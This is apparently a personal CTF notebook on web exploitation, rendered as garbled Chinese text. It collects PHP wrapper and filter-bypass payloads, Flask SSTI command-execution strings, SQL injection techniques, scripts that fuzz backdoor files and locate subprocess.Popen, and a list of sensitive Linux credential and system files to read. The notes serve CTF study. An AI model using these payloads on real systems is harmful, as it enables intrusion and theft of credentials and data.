# Webç¬”è®°

è¶Šæ¥è¶Šè®¤è¯†åˆ°ä»€ä¹ˆæ˜¯â€œå¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´â€ã€‚

1. å½“ç½‘ç«™æ²¡æœ‰ä»»ä½•æç¤ºæ—¶ï¼Œå¯ä»¥å»çœ‹çœ‹ä¸€äº›æ•æ„Ÿç›®å½•ã€‚

ä¾‹å¦‚ï¼š

```
/robots.txt
/.git(è¿™ä¸ªç›®å½•æœ‰æ—¶å€™å¯ä»¥ç›´æ¥çœ‹ï¼Œæœ‰æ—¶å€™ä¼šè¢«forbiddenã€‚å°±ç®—è¢«forbiddenäº†ä¹Ÿè¯æ˜è¿™ä¸ªç›®å½•æ˜¯å­˜åœ¨çš„ï¼Œè€ƒç‚¹å¯èƒ½æ˜¯gitæ³„éœ²ã€‚)
/www.zipï¼ˆæœ‰æ—¶å€™ä¼šæœ‰ç½‘ç«™æºç ï¼‰
```

ä¸è¿‡è¿™æ ·è’™ç›®å½•åŸºæœ¬æ²¡å•¥ç”¨ã€‚å»ºè®®è¿›ä¸€æ­¥ä½¿ç”¨å·¥å…·æ‰«æç›®å½•ã€‚ä¸è¿‡å·¥å…·ä¸æ˜¯ä¸‡èƒ½çš„ï¼Œä¼šå‡ºç°æ¼æ‰«çš„æƒ…å†µã€‚å°è¯•æŠŠçº¿ç¨‹è°ƒä½æˆ–è€…æ‰‹åŠ¨æ£€æŸ¥ä¸€äº›ç®€å•çš„ã€‚

2. æ°¸è¿œä¸è¦å¿˜è®°æŸ¥çœ‹æºä»£ç ä»¥åŠå¼€å‘è€…å·¥å…·ã€‚

å¾ˆå¤šæ—¶å€™æç¤ºéƒ½ä¼šè—åœ¨æ³¨é‡Šé‡Œã€‚è¿˜æœ‰ç”šè€…è—åœ¨æœåŠ¡å™¨è¿”å›çš„httpæŠ¥æ–‡é‡Œï¼Œconsoleé‡Œã€‚è¿™äº›éƒ½å¯ä»¥ç”¨chromeæŸ¥çœ‹ã€‚networké€‰é¡¹ä¸­å¯ä»¥è®°å½•æŠ¥æ–‡ï¼Œå¦‚æœå•çº¯å°±æ˜¯çœ‹ä¸ªæŠ¥æ–‡ä¹Ÿæ²¡å¿…è¦ä¸“é—¨å¼€ä¸ªbpã€‚è¿˜æœ‰æœ€é‡è¦çš„ï¼Œä¸€äº›phpé¢˜åŒ…å«flagåå¾ˆæœ‰å¯èƒ½åŒ…å«åœ¨æ³¨é‡Šé‡Œï¼Œç½‘é¡µç›´æ¥æ˜¯çœ‹ä¸åˆ°çš„ã€‚è¿™æ—¶å€™ä¸çœ‹æºä»£ç é”™è¿‡flagçœŸçš„å¤ªå†¤äº†ã€‚

3. è¦æœ‰bpæŠ“åŒ…å’Œæ”¹åŒ…çš„ä¹ æƒ¯ã€‚

æŠ“åŒ…å¯ä»¥æœ€æ¸…æ¥šçœ‹åˆ°å‘é€äº†ä»€ä¹ˆä¸œè¥¿ï¼Œæ¥æ”¶äº†ä»€ä¹ˆä¸œè¥¿ã€‚æ”¹åŒ…æ˜¯ä¸ºäº†è®©å®¢æˆ·ç«¯å‘å‡ºå»ä¸€äº›éé¢„æœŸå†…å®¹ï¼Œæµ‹è¯•èƒ½ä¸èƒ½è§¦å‘éšè—bugã€‚

4. flask sessionä¼ªé€ 

[ä¾‹é¢˜](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/%E6%8A%BD%E8%80%81%E5%A9%86.md)ã€‚è¿™é¢˜è¿˜æœ‰ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½çš„è€ƒç‚¹ï¼Œä¹Ÿå¾ˆç»å…¸ã€‚

5. [phpä¼ªåè®®](https://segmentfault.com/a/1190000018991087)

[ä¾‹é¢˜](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/1%E7%BA%A7/Web/fileclude.md)ã€‚å¾ˆå¤šæ—¶å€™ç”¨æ¥è¯»å–æºä»£ç ï¼Œæ ‡å¿—å‡½æ•°ä¸ºincludeå‡½æ•°ç³»åˆ—ã€‚æ³¨æ„php://filterä¼ªåè®®è¿˜å¯ä»¥å¥—å¦ä¸€å±‚åè®®ï¼Œä¸ä¸€å®šéè¦å†™`php://filter/read=convert.base64-encode/resource=flag.php`è¿™ç±»çš„ï¼Œå†™`php://filter/read=convert.base64-encode/xxx/resource=flag.php`ä¹Ÿè¡Œï¼Œxxxè‡ªå®šï¼Œå¯ç”¨äºç»•è¿‡æ»¤ã€‚å¦‚[è¿™é“é¢˜](https://blog.csdn.net/mochu7777777/article/details/105204141)ã€‚æˆ–è€…å¤§å°å†™æ··ç”¨ï¼Œä¸è¦readä¹Ÿå¯ä»¥:`pHp://filter/convert.baSe64-encode/resource=/flag`ã€‚å¦‚æœbase64ç­‰å…³é”®å­—ç¬¦è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥è€ƒè™‘åŒurlencodeç»•è¿‡ï¼Œå¦‚`php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=flag.php`ã€‚[ä¾‹é¢˜2](https://blog.csdn.net/m0_56059226/article/details/119758074)ï¼Œä½¿ç”¨zipä¼ªåè®®ï¼Œè¿™ä¸ªåè®®å¿½è§†åç¼€ï¼Œä¸æ˜¯zipï¼Œä¾‹å¦‚jpgåç¼€ä¹Ÿå¯ä»¥è¯»å–ã€‚æ ¼å¼ä¸º`zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„ï¼ˆç½‘ç«™ä¸Šç›¸å¯¹è·¯å¾„ä¹Ÿè¡Œï¼‰]%23[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶åï¼ˆæœ¨é©¬ï¼‰]ï¼ˆ#ç¼–ç ä¸º%23ï¼Œ#åœ¨getè¯·æ±‚ä¸­ä¼šå°†åé¢çš„å‚æ•°å¿½ç•¥æ‰€ä»¥ä½¿ç”¨getè¯·æ±‚æ—¶å€™åº”è¿›è¡Œurlç¼–ç ï¼‰`ã€‚

1. php preg_replaceå‡½æ•°/eé€‰é¡¹ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œ

è¿™ç¯‡[æ–‡ç« ](https://xz.aliyun.com/t/2557)è®²çš„å¾ˆå¥½ã€‚[ics-05](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/3%E7%BA%A7/Web/ics-05.md)æ˜¯ä¸€é“å…³äºè¯¥æ¼æ´çš„ä¾‹é¢˜ã€‚è¿˜æœ‰å’Œæ–‡ç« ä¸­æåˆ°çš„åˆ©ç”¨æ–¹æ³•æ€è·¯å®Œå…¨ä¸€æ ·çš„é¢˜ï¼š[[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBJDCTF2020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4.md)ã€‚

7. php rceä¹‹<?=å’Œåå¼•å·çš„åˆ©ç”¨ã€‚ä¾‹é¢˜ï¼š[RCEæŒ‘æˆ˜1](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/RCE%E6%8C%91%E6%88%981.md)

8. phpæ— å­—æ¯æ•°å­—rceä¹‹è‡ªå¢åˆ©ç”¨ã€‚ä¾‹é¢˜ï¼š[RCEæŒ‘æˆ˜2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/RCE%E6%8C%91%E6%88%982.md)
9. xmlåŸºæœ¬xxeåˆ©ç”¨ã€‚ä¾‹é¢˜ï¼š[[NCTF2019]Fake XML cookbook](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BNCTF2019%5DFake%20XML%20cookbook.md)ã€‚æ³¨æ„[svgæ–‡ä»¶](https://baike.baidu.com/item/SVG%E6%A0%BC%E5%BC%8F/3463453)ä¹Ÿæ˜¯åŸºäºxmlå¼€å‘çš„ï¼ŒåŒæ ·ä¹Ÿæœ‰xxeã€‚ä¾‹é¢˜:[[BSidesCF 2019]SVGMagic](https://blog.csdn.net/shinygod/article/details/124052707)
10. shellå‘½ä»¤æ‰§è¡Œå¸¸è§[ç»•è¿‡](https://blog.51cto.com/m0re/3879244)
11. [md5ç¢°æ’](https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value)ã€‚è¿™æ˜¯ä¸€äº›hexç¼–ç ä¸‹å†…å®¹ä¸åŒå´èƒ½äº§ç”Ÿç›¸åŒmd5å€¼çš„å­—ç¬¦ä¸²ã€‚
12. ä¸€äº›åœ¨é»‘åå•è¿‡æ»¤æ—¶å¯äº’ç›¸äº¤æ¢çš„å‘½ä»¤
- æŸ¥çœ‹ç›®å½•
> ls<Br>dir
- è¾“å‡ºæ–‡ä»¶å†…å®¹
> cat<br>[sort](https://www.cnblogs.com/51linux/archive/2012/05/23/2515299.html)ã€‚sortæœ¬æ˜¯æ’åºå‘½ä»¤ï¼Œä½†æ˜¯é»˜è®¤ä¼šæŠŠæ‰§è¡Œåçš„ç»“æœè¾“å‡ºåˆ°ç»ˆç«¯ã€‚<Br>[tail](https://www.runoob.com/linux/linux-comm-tail.html)ï¼Œé»˜è®¤æ˜¾ç¤ºæ–‡ä»¶å°¾éƒ¨çš„å†…å®¹ã€‚ç”±äºflagæ–‡ä»¶åŸºæœ¬ä¸ä¼šè¶…è¿‡åè¡Œï¼Œæ‰€ä»¥ä½œç”¨å·®ä¸å¤š<br>tacï¼Œå€’åºè¾“å‡ºæ–‡ä»¶å†…å®¹
13. sstiï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰ã€‚è¿™å¼ ç®€å•ä½†æ˜¯ç»å…¸çš„è¡¨è¯´æ˜å½“å‡ºç°sstiæ—¶å¦‚ä½•æµ‹è¯•æ˜¯ä»€ä¹ˆæ¨¡æ¿ã€‚

![ssti_test](../../CTF/BUUCTF/images/Pasted-1-768x458.png)

æ¨¡æ¿æ³¨å…¥åˆ†å¾ˆå¤šç§ï¼Œæ…¢æ…¢ç§¯ç´¯ã€‚

- [twig](https://xz.aliyun.com/t/10056#toc-13)(php)
- [smarty](https://www.anquanke.com/post/id/272393)(php)
- [flask](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/3%E7%BA%A7/Web/shrine.md)(python)ã€‚ä¾‹é¢˜1:[[GYCTF2020]FlaskApp](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BGYCTF2020%5DFlaskApp.md)ã€‚ä¾‹é¢˜2ï¼ˆåˆ©ç”¨[subprocess.Popen](https://blog.csdn.net/whatday/article/details/109315876)æ‰§è¡Œå‘½ä»¤ï¼‰:[[CSCCTF 2019 Qual]FlaskLight](https://blog.csdn.net/mochu7777777/article/details/107589811)
- å½“flaskçš„{{}}è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ç”¨{%%}æ¥ç»•è¿‡è¿‡æ»¤ã€‚ä¾‹é¢˜:[[GWCTF 2019]ä½ çš„åå­—](https://blog.csdn.net/cjdgg/article/details/119813547),æ›´å¤šç»•è¿‡æ–¹å¼å¯å‚è€ƒ[æ­¤å¤„](https://blog.csdn.net/miuzzx/article/details/110220425)
- æœ€ç®€å•çš„getshell payload(é…åˆeval): `__import__("os").popen("ls").read()`ï¼Œæ¥æº:[[watevrCTF-2019]Supercalc](https://blog.csdn.net/a3320315/article/details/104272833)
- [æ›´å¤šæ¨¡æ¿æ³¨å…¥payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

èƒ½å‘ç°flaskæ³¨å…¥éœ€è¦å¤§é‡`.`,`_`ï¼Œå¦‚æœè¢«è¿‡æ»¤äº†å¯ä»¥ç”¨`[]`æ›¿ä»£`.`ï¼Œ16è¿›åˆ¶ç¼–ç æ›¿ä»£`_`ã€‚ä¾‹å¦‚`{{()."__class__"."__bases__"[0]."__subclasses__"()[91]["get_data"](0, "/proc/self/fd/3")}}`ç»•è¿‡è¿‡æ»¤çš„å†™æ³•å°±æ˜¯`{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}`ã€‚ä¾‹é¢˜:[[pasecactf_2019]flask_ssti](https://blog.csdn.net/qq_40800734/article/details/107011638)

1.  [æµè§ˆå™¨è®¾ç½®ç¼–ç ](https://blog.csdn.net/jnx1142410525/article/details/55271037)ã€‚å¦‚æœæµè§ˆå™¨çš„ç¼–ç ä¸å¯¹å°±ä¼šå‡ºç°ä¹±ç ã€‚
2.  php md5ç›¸å…³ç‰¹æ€§ã€‚
- md5åŸå§‹äºŒè¿›åˆ¶åˆ©ç”¨+0eç»•è¿‡md5å¼±ç­‰äº+æ•°ç»„ç»•è¿‡md5å¼ºç­‰äºï¼š[Easy MD5](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/Easy%20MD5.md)ã€‚
- ä¸€ä¸ª0eå¼€å¤´ä¸”å…¶md5å€¼ä¹Ÿæ˜¯0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œå¯ç”¨äºå¼±ç­‰äºï¼š`0e215962017`
1.  php 5 intvalç‰¹æ€§ï¼š[[WUSTCTF2020]æœ´å®æ— å](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E.md)
2.  githackeråŸºæœ¬å‘½ä»¤
- githacker --url http://example.com/.git --output-folder ./output

1.  å¤šæ–‡ä»¶å†…å¯»æ‰¾å¯ç”¨shellè„šæœ¬ã€‚ä»Šå¤©é‡è§ä¸€é“é¢˜ï¼Œæ•´ä¸ªç½‘ç«™å…¨æ˜¯åé—¨æ–‡ä»¶ï¼Œç„¶è€Œåªæœ‰ä¸€ä¸ªæ˜¯æœ‰ç”¨çš„ã€‚ç®—æ˜¯fuzzé¢˜çš„å˜ç§ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹å¤šçº¿ç¨‹è„šæœ¬æ‰¾åˆ°ã€‚

```python
import os
import requests
import re
import threading
import time

print('å¼€å§‹æ—¶é—´ï¼š '+ time.asctime(time.localtime(time.time()))) 
s1 = threading.Semaphore(100)
filePath = r"src"
os.chdir(filePath)
requests.adapters.DEFAULT_RETRIES = 5
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False
def get_content(file):
    s1.acquire()
    print('tring  '+file+'   '+time.asctime(time.localtime(time.time())))
    with open(file,encoding='utf-8') as f:
        gets = list(re.findall('\$_GET\[\'(.*?)\'\]',f.read()))
        posts = list(re.findall('\$_POST\[\'(.*?)\'\]',f.read()))
    data = {}
    params = {}
    for m in gets:
        params[m] = "echo '123456';"
    for n in posts:
        data[n] = "echo '123456';"
    url = "æ­¤å¤„å¡«æœ¬åœ°ç½‘ç«™åœ°å€" +file  #è¿œç¨‹çš„ä¹Ÿèƒ½postå’Œgetåˆ°ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥fuzzä¸å‡ºæ¥
    req = session.post(url,data=data,params=params)
    req.close()
    req.encoding = 'utf-8'
    content=req.text
    if '123456' in content:
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo '123456';")
            content =req.text
            req.close()
            if "123456" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo '123456';"})
                content =req.text
                req.close()
                if "123456" in content:
                    break
        if flag == 1:
            params = a
        else:
            params = b
        print('æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š ' + file +"  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s" %params)
        print('ç»“æŸæ—¶é—´ï¼š '+time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:
    t = threading.Thread(target=get_content,args=(i,))
    t.start()
```

é¢˜ç›®åŠæ¥æºï¼š[[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢](https://blog.csdn.net/qq_51684648/article/details/120167176)

19. php extractå˜é‡è¦†ç›–+ååºåˆ—åŒ–é€ƒé€¸æ¼æ´ã€‚ä¾‹é¢˜:[[å®‰æ´µæ¯ 2019]easy_serialize_php](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php.md)

20. python unicodedata.numeric æ¼æ´ã€‚ä¾‹é¢˜ï¼š[[ASIS 2019]Unicorn shop](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BASIS%202019%5DUnicorn%20shop.md)

21. phpé­”æœ¯æ–¹æ³•ï¼š[å®˜æ–¹æ–‡æ¡£](https://www.php.net/manual/zh/language.oop5.magic.php)ã€‚ä¾‹é¢˜ï¼š[[MRCTF2020]Ezpop](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BMRCTF2020%5DEzpop.md)

22. php [->,=>å’Œ::ç¬¦å·è¯¦è§£](https://segmentfault.com/a/1190000008600674)ã€‚

23. å‘½ä»¤æ³¨å…¥çš„nmapåˆ©ç”¨ï¼š-oGé€‰é¡¹å†™shellå¹¶ç»•è¿‡php escapeshellargå’Œescapeshellcmdå‡½æ•°ã€‚ä¾‹é¢˜ï¼š[[BUUCTF 2018]Online Tool](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBUUCTF%202018%5DOnline%20Tool.md)

24. [phpç‰¹æ®Šæ ‡ç­¾ç»•è¿‡æ»¤](https://www.cnblogs.com/jinqi520/p/11417365.html)
25. phpåˆ©ç”¨æ•°å­¦å‡½æ•°æ„é€ ä»»æ„shellã€‚ä¾‹é¢˜ï¼š[[CISCN 2019 åˆèµ›]Love Math](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BCISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math.md)
26. å½“é¢˜ç›®æœ‰æåˆ°â€œæ£€æŸ¥ipâ€ï¼Œâ€œåªæœ‰æˆ‘è‡ªå·±â€¦â€¦â€ç­‰æœ‰å…³è·å–ipçš„å†…å®¹æ—¶ï¼Œå¯ä»¥è€ƒè™‘æ˜¯å¦åœ¨xffä¸Šåšäº†æ‰‹è„šï¼Œæ¯”å¦‚æˆ‘ä»¬èƒ½æŠŠxffæ”¹ä¸º127.0.0.1æ¥ä¼ªé€ æœ¬æœºï¼Œç”šè‡³æ˜¯æ‰§è¡Œæ¨¡æ¿æ³¨å…¥ã€‚ä¾‹é¢˜:[[MRCTF2020]PYWebsite](https://buuoj.cn/challenges#[MRCTF2020]PYWebsite)
27. flagå¯èƒ½ä¼šå‡ºç°åœ¨phpinfoç•Œé¢çš„Environmenté‡Œï¼Œæœ‰æ—¶å€™æ˜¯å› ä¸ºå‡ºé¢˜äººé…ç½®é”™è¯¯ï¼Œæœ‰æ—¶å€™å°±æ˜¯è¿™ä¹ˆè®¾è®¡çš„ã€‚ä¾‹é¢˜ï¼š[[NPUCTF2020]ReadlezPHP](https://buuoj.cn/challenges#[NPUCTF2020]ReadlezPHP)
28. sqlæ³¨å…¥ã€‚

- åœ¨information_schemè¢«banåçš„æ›¿ä»£æ³¨å…¥+[æ— åˆ—åæ³¨å…¥](https://blog.csdn.net/qq_45521281/article/details/106647880)ã€‚ä¾‹é¢˜ï¼š[[SWPU2019]Web1](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BSWPU2019%5DWeb1.md)
- updatexmlæŠ¥é”™æ³¨å…¥ã€‚ä¾‹é¢˜:[HardSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/HardSQL.md)
- å †å æ³¨å…¥+ç¬¦å·`||`çš„åˆ©ç”¨ã€‚ä¾‹é¢˜:[EasySQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/EasySQL.md)
- è”åˆæŸ¥è¯¢ï¼ˆunion selectï¼‰ä¼šæ„é€ è™šæ‹Ÿæ•°æ®ï¼Œåˆ©ç”¨æ­¤è™šæ‹Ÿæ•°æ®å¯ä»¥ä¼ªé€ ç™»å½•ã€‚ä¾‹é¢˜ï¼š[BabySQli](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/BabySQli.md)
- äºŒåˆ†æ³•å¼‚æˆ–ç›²æ³¨ã€‚ä¾‹é¢˜:[[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL.md)
- sqlæ­£åˆ™regexp+äºŒæ¬¡æ³¨å…¥+updatexmlæŠ¥é”™æ³¨å…¥ã€‚ä¾‹é¢˜:[[RCTF2015]EasySQL](../../CTF/BUUCTF/Web/[RCTF2015]EasySQL.md)
29. phpä½¿ç”¨è¯»å–æ–‡ä»¶çš„ä¸åŒæ–¹å¼ï¼Œå¯ç”¨äºç»•è¿‡æ»¤ã€‚

```php
system("cat /flag");
file_get_contents("/flag");
readfile("/flag");
highlight_file("/flag");
show_source("flag.php")
```

30. MD5hashé•¿åº¦æ‰©å±•æ”»å‡»+chromeåˆ©ç”¨ä»£ç æ·»åŠ cookieã€‚ä¾‹é¢˜ï¼š[[De1CTF 2019]SSRF Me](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BDe1CTF%202019%5DSSRF%20Me.md)
31. ssiæ³¨å…¥æ¼æ´ã€‚ä¾‹é¢˜:[[BJDCTF2020]EasySearch](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBJDCTF2020%5DEasySearch.md)
32. idnaç¼–ç +utf-8è§£ç é€ æˆçš„è¿‡æ»¤ç»•è¿‡ã€‚ä¾‹é¢˜:[[SUCTF 2019]Pythonginx](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BSUCTF%202019%5DPythonginx.md)
33. phpæ ¼å¼åŒ–å­—ç¬¦ä¸²é€ƒé€¸+æ•°ç»„ç»•è¿‡strlenæ£€æŸ¥ã€‚ä¾‹é¢˜1:[[0CTF 2016]piapiapia](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B0CTF%202016%5Dpiapiapia.md)ï¼›ä¾‹é¢˜2:[baby_unserialize](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Web/baby_unserialize.md)
34. phpæ™®é€šæ— å­—æ¯æ•°å­—getshell+ç»•è¿‡disable functions
35. chrome consoleå‘é€postè¯·æ±‚

[æ¥æº](https://cloud.tencent.com/developer/article/1805343)

```js
var url = "http://28401609-7e35-445a-84b7-509187f6de3f.node4.buuoj.cn:81/secrettw.php";

var params = "Merak=a";

var xhr = new XMLHttpRequest();

xhr.open("POST", url, true);

xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"); 

xhr.onload = function (e) {

  if (xhr.readyState === 4) {

    if (xhr.status === 200) {

      console.log(xhr.responseText);

    } else {

      console.error(xhr.statusText);

    }

  }

};

xhr.onerror = function (e) {

  console.error(xhr.statusText);

};

xhr.send(params);
```

36. PHPä¼šå°†ä¼ å‚ä¸­çš„ç©ºæ ¼( )ã€å°æ•°ç‚¹(.)è‡ªåŠ¨æ›¿æ¢æˆä¸‹åˆ’çº¿ã€‚ä¾‹é¢˜:[[MRCTF2020]å¥—å¨ƒ](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BMRCTF2020%5D%E5%A5%97%E5%A8%83.md)
37. ä»¥ä¸‹ä»£ç å¯ä¼ å…¥23333%0aç»•è¿‡ã€‚å¯ä»¥è¯´æœ«å°¾åŠ ä¸ª%0aæ˜¯ç»•è¿‡`^xxx$`è¿™ä¸ªæ ¼å¼çš„æ™®éè§£æ³•ï¼Œå› ä¸ºpreg_matchåªèƒ½åŒ¹é…ä¸€è¡Œæ•°æ®ï¼Œæ— æ³•å¤„ç†æ¢è¡Œç¬¦ã€‚
```php
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

38.  php pcreå›æº¯é™åˆ¶ç»•è¿‡preg_matchã€‚ä¾‹é¢˜:[[FBCTF2019]RCEService](../../CTF/BUUCTF/Web/[FBCTF2019]RCEService.md)
39.  php basenameç‰¹æ€§+$_SERVER['PHP_SELF']ä½¿ç”¨+urlè§£æç‰¹æ€§ã€‚ä¾‹é¢˜:[[Zer0pts2020]Can you guess it?](../../CTF/BUUCTF/Web/[Zer0pts2020]Can%20you%20guess%20it%3F.md)
40.  python pickleååºåˆ—åŒ–æ¼æ´+jwtçˆ†ç ´secret keyã€‚ä¾‹é¢˜:[bilibili](../../CTF/æ”»é˜²ä¸–ç•Œ/9çº§/Web/bilibili.md)ã€‚pickleä¹Ÿå¯ä»¥ç”¨æ¥åå¼¹shellã€‚ä¾‹é¢˜:[[watevrCTF-2019]Pickle Store](https://blog.csdn.net/mochu7777777/article/details/107589233)
41.  python flaskæ¨¡æ¿æ³¨å…¥è„šæœ¬æŸ¥æ‰¾subprocess.Popenç´¢å¼•ã€‚

[æ¥æº](https://blog.csdn.net/mochu7777777/article/details/107589811)

```python
import requests 
import re 
import html 
import time 
index = 0 
for i in range(170, 1000): 
    try: 
        url = "http://e5df30ec-7e81-425e-b1cf-0988f6f9ae6f.node4.buuoj.cn:81/?search={{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}" 
        r = requests.get(url) 
        res = re.findall("<h2>You searched for:<\/h2>\W+<h3>(.*)<\/h3>", r.text) 
        time.sleep(0.1)
        # print(res) 
        # print(r.text) 
        res = html.unescape(res[0]) 
        print(str(i) + " | " + res) 
        if "subprocess.Popen" in res: 
            index = i 
            break 
    except: 
        continue
print("index of subprocess.Popen:" + str(index))
```

42. ä½¿ç”¨[php_mt_seed](https://www.openwall.com/php_mt_seed/)çˆ†ç ´phpä¼ªéšæœºæ•°å‡½æ•°[mt_rand](https://www.freebuf.com/vuls/192012.html)ç§å­ã€‚ä¾‹é¢˜:[[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–](https://blog.csdn.net/shinygod/article/details/124067962)
43. linuxå¯è¯»å–çš„æ•æ„Ÿæ–‡ä»¶ã€‚

[æ¥æº](https://www.shawroot.cc/1007.html)

```
/etc/passwd
/etc/shadow
/etc/hosts
/root/.bash_history //rootçš„bashå†å²è®°å½•
/root/.ssh/authorized_keys
/root/.mysql_history //mysqlçš„bashå†å²è®°å½•
/root/.wget-hsts
/opt/nginx/conf/nginx.conf //nginxçš„é…ç½®æ–‡ä»¶
/var/www/html/index.html
/etc/my.cnf
/etc/httpd/conf/httpd.conf //httpdçš„é…ç½®æ–‡ä»¶
/proc/self/fd/fd[0-9]*(æ–‡ä»¶æ ‡è¯†ç¬¦)
/proc/mounts
/proc/config.gz
/proc/sched_debug // æä¾›cpuä¸Šæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯ï¼Œå¯ä»¥è·å¾—è¿›ç¨‹çš„pidå·ï¼Œå¯ä»¥é…åˆåé¢éœ€è¦pidçš„åˆ©ç”¨
/proc/mounts // æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿåˆ—è¡¨
/proc/net/arp //arpè¡¨ï¼Œå¯ä»¥è·å¾—å†…ç½‘å…¶ä»–æœºå™¨çš„åœ°å€
/proc/net/route //è·¯ç”±è¡¨ä¿¡æ¯
/proc/net/tcp and /proc/net/udp // æ´»åŠ¨è¿æ¥çš„ä¿¡æ¯
/proc/net/fib_trie // è·¯ç”±ç¼“å­˜,å¯ç”¨äºæ³„éœ²å†…ç½‘ç½‘æ®µ
/proc/version // å†…æ ¸ç‰ˆæœ¬
//ä»¥ä¸‹æ–‡ä»¶è‹¥ä¸çŸ¥é“PIDï¼Œç”¨selfä»£æ›¿ä¹Ÿå¯ä»¥
/proc/[PID]/cmdline // å¯èƒ½åŒ…å«æœ‰ç”¨çš„è·¯å¾„ä¿¡æ¯
/proc/[PID]/environ // ç¨‹åºè¿è¡Œçš„ç¯å¢ƒå˜é‡ä¿¡æ¯ï¼Œå¯ä»¥ç”¨æ¥åŒ…å«getshellã€‚ä¹Ÿæœ‰ä¾‹å¦‚flaskçš„é¢˜ç›®ä¼šæŠŠSECRET KEYæ”¾é‡Œé¢
/proc/[PID]/cwd // å½“å‰è¿›ç¨‹çš„å·¥ä½œç›®å½•
/proc/[PID]/fd/[#] // è®¿é—®file descriptorsï¼ŒæŸå†™æƒ…å†µå¯ä»¥è¯»å–åˆ°è¿›ç¨‹æ­£åœ¨ä½¿ç”¨çš„æ–‡ä»¶ï¼Œæ¯”å¦‚access.log
/proc/self/cmdline //è·å–å½“å‰å¯åŠ¨è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤
